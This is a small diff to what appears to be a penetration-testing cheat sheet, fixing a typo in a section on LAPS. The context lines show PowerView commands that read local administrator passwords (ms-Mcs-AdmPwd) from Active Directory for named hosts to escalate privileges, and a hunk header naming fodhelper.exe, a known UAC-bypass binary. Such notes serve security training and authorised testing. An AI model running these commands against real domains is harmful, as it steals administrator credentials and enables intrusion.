@@ -184,7 +184,7 @@ C:\Windows\System32\fodhelper.exe
 
 #### LAPS 
 ```
-IF we can read LAPS password we can escalated to local admin
+IF we can read LAPS password we can escalate to local admin
 
 Get-DomainObject -Identity client -Properties ms-Mcs-AdmPwd
 Get-DomainObject -Identity web05 -Properties ms-Mcs-AdmPwd
